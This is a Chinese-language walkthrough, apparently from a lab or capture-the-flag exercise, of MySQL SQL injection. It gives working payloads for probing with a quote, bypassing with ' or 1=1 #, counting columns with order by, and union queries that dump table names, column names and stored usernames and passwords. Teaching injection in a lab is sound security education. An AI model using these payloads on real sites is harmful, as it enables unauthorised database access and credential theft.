## 步骤 1：判断注入点

输入一个单引号 `'` 提交。
页面出现 MySQL 语法错误，说明存在单引号字符注入，SQL 被引号破坏。

## 步骤 2：逻辑测试确认

1. 输入 payload：`' or 1=1 #`

> 
> 拼接后 SQL

```
select * from users where username='' or 1=1 # ';
```

`-- `是 SQL 注释，把后面原来的单引号注释掉；`or 1=1`条件恒真，页面会返回全部用户数据，说明注入生效。

> 
> 注意：`--`后面**必须有空格**，也可以用`#`做注释：`' or 1=1 #`

## 步骤 3：union 联合查询，爆库、表、字段、数据

### ① 判断回显列数（order by 猜列）

```
' order by 1 -- 
' order by 2 -- 
' order by 3 -- 
```

`order by 3`报错，说明查询只有**2 列**，可以 union select 1,2。

### ② 查询当前数据库名

payload：

```
' union select database(),version() #
```

### ③ 查询所有表名

```
' union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() # 
```

### ④ 查询 users 表的字段名

```
' union select 1,group_concat(column_name) from information_schema.columns where table_name='users' # 
```

### ⑤ 脱裤，读取用户名密码

```
' union select username,password from users #
```

提交后页面就打印出所有账号密码，拿到 flag / 数据。



常用注入命令：  结尾使用 -- 或者 # 号来注释后面的字符。看数据库
' or 1=1 #
' order by 1 #
' order by 2 #
' order by 3 #  报错了，说明只有两列

查看当前数据库名字
' union select database(),version() #

